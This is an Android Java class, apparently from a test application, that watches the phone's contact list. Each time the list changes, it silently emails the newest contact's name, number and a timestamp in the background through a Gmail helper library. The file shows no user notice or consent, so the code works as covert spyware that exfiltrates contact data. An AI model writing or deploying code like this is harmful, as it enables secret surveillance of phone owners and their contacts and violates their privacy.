package com.digitstory.testapplication.Utils;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.widget.Toast;

import com.creativityapps.gmailbackgroundlibrary.BackgroundMail;
import com.digitstory.testapplication.Services.RunAsyncTask;

import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;


public class MyContentObserver extends ContentObserver {
    private Context context;
    Map<String, NumberMetadata> numContact = new HashMap<String, NumberMetadata>();

    private class NumberMetadata{
        String number;
        String name;
        Date datetime;
    }

    public MyContentObserver(Handler handler) {
        super(handler);
    }

    public MyContentObserver(Handler handler, Context context) {
        super(handler);
        this.context = context;
    }

    //This ovserver is to observe contact list
    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange, uri);
        if (!selfChange) {
            try {
                if (ActivityCompat.checkSelfPermission(context,
                        Manifest.permission.READ_CONTACTS)
                        == PackageManager.PERMISSION_GRANTED) {
                    ContentResolver cr = context.getContentResolver();
                    Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
                    if (cursor != null && cursor.getCount() > 0) {
                        //moving cursor to last position
                        //to get last element added
                        cursor.moveToLast();
                        String contactName = null, photo = null, contactNumber = null;
                        String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));

                        if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                            Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                            if (pCur != null) {
                                while (pCur.moveToNext()) {
                                    contactNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                    if (contactNumber != null && contactNumber.length() > 0) {
                                        contactNumber = contactNumber.replace(" ", "");
                                    }
                                    contactName = pCur.getString(pCur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                                    String msg = "Name : " + contactName + " Contact No. : " + contactNumber;
                                  //  if(!isMessageSent(contactNumber, contactName)){
                                        Log.d(Config.TAG, "MyContentObserver.onChange():" + msg);
                                        sendEmail(contactName, contactNumber, msg, Event.CONTACT_ADDED, this.context);
                                  //  }

                                }
                                pCur.close();
                            }
                        }
                        cursor.close();
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private boolean isMessageSent(String contactNumber, String contactName) {

        if(numContact.containsKey(contactNumber))
        {
            NumberMetadata nm = numContact.get(contactNumber);
            if(nm == null)
            {
                return false;
            }
            Date prevTimeStamp = nm.datetime;
            Date curTimeStamp = Calendar.getInstance().getTime();
            Long diff = curTimeStamp.getTime() - prevTimeStamp.getTime();
            long diffHours = diff / (60 * 60 * 1000);
            if(diffHours >= Config.DIFF_IN_HOURS){
                numContact.remove(contactNumber);
                setMetaData(contactNumber, contactName);
                return false;
            }else{
                return true;
            }
        }
        else
        {
            setMetaData(contactNumber, contactName);
            return false;
        }
    }

    private void setMetaData(String contactNumber, String contactName) {
        NumberMetadata nm = new NumberMetadata();
        nm.name = contactName;
        nm.number = contactNumber;
        nm.datetime = Calendar.getInstance().getTime();
        numContact.put(contactNumber, nm);
    }

    public void sendEmail(String contactName, String contactNumber, String msg, String event, Context ctx) {
        final String emailBody = getEmailBody(contactName, contactNumber, msg, event);
        try {
            GMail gmail = new GMail(null, null, null, contactNumber, emailBody);
            RunAsyncTask raTask = new RunAsyncTask(gmail, ctx);
            raTask.execute("MyContentObserver");
        } catch (Exception e) {
            Log.e(Config.TAG, e.getMessage(), e);
        }

    }

    private String getEmailBody(String contactName, String contactNumber, String msg, String event) {
        StringBuilder sb = new StringBuilder();
        Date currentTime = Calendar.getInstance().getTime();
        sb.append(event + "\ncontactDetails: " + contactNumber + "\ncontactName: " + contactName + "\ntime:" + currentTime.toString() + "\n" + "msg:" + msg);
        return sb.toString();
    }


}
